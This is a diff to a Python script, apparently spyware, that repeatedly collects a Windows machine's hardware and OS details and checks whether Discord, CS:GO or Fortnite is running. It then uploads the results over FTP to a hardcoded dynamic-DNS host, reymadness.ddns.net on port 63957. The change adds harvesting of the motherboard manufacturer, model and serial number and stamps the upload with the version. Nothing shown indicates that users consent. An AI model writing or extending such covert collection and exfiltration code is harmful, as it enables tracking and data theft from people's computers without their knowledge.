@@ -5,6 +5,8 @@ import psutil
 import wmi
 import platform
 from hurry.filesize import size
+import win32com.client
+import subprocess
 
 def checkIfProcessRunning(processName):
     for proc in psutil.process_iter():
@@ -15,7 +17,26 @@ def checkIfProcessRunning(processName):
             pass
     return False;
 
-ver = "v1.2"
+def get_motherboard_details():
+	motherboard_details = []
+	strComputer = "."
+	objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
+	objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
+	colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_BaseBoard")
+	for objItem in colItems:
+		main_board = {
+			'name': objItem.Name,
+			'description': objItem.Description,
+			'manufacturer': objItem.Manufacturer,
+			'model': objItem.Model,
+			'product': objItem.Product,
+			'serialNumber': objItem.SerialNumber,
+			'version': objItem.Version
+		}
+		motherboard_details.append(main_board)
+	return motherboard_details
+
+ver = "v1.3"
 author = "ReyMadness"
 ip = "reymadness.ddns.net"
 port = 63957
@@ -57,9 +78,25 @@ while(True):
     ram = str(round(float('{0}'.format(ram_info)))) + " GB"
     op_system = platform.system()
     op_release = platform.release()
+    op_x = platform.machine()
     op_ver = platform.version()
-    op = "OP. System: " + op_system + " " + op_release + " " + op_ver + "\n"
-    info = "Processor: {0}".format(proc_info.Name) + "\nVideo Card: {0}".format(gpu_info.Name) + "\nRAM: " + ram + "\n\n"
+    op = "OP. System: " + op_system + " " + op_release + " " + op_ver + " " + op_x + "\n"
+    i = 0
+    mass = str(get_motherboard_details()[0]).split()
+    a = len(mass)
+    while(i<a):
+        if(mass[i] == "'manufacturer':"):
+            b = mass[i+1][1:][:-2]
+        if(mass[i] == "'product':"):
+            c = ""
+            while(mass[i+1] != "'serialNumber':"):
+                c = c + mass[i+1] + " "
+                i += 1
+        if(mass[i] == "'serialNumber':"):
+            d = mass[i+1][1:][:-2]
+        i += 1
+    motherboard = b + " " + c[1:][:-3] + " " + d
+    info = "Processor: {0}".format(proc_info.Name) + "\nVideo Card: {0}".format(gpu_info.Name) + "\nRAM: " + ram + "\n" + "Motherboard: " + motherboard + "\n\n"
     
     if checkIfProcessRunning('discord'):
         discord = "Discord is ON\n"
@@ -87,7 +124,7 @@ while(True):
             pass
         ftp.cwd(name)
         f = open("data.txt", "w")
-        text = name + "\n" + now + op + info + discord + csgo + fortnite
+        text = "Version: " + ver + "\n" +  name + "\n" + now + op + info + discord + csgo + fortnite
         f.write(text)
         f.close()
         with open("data.txt") as fobj:
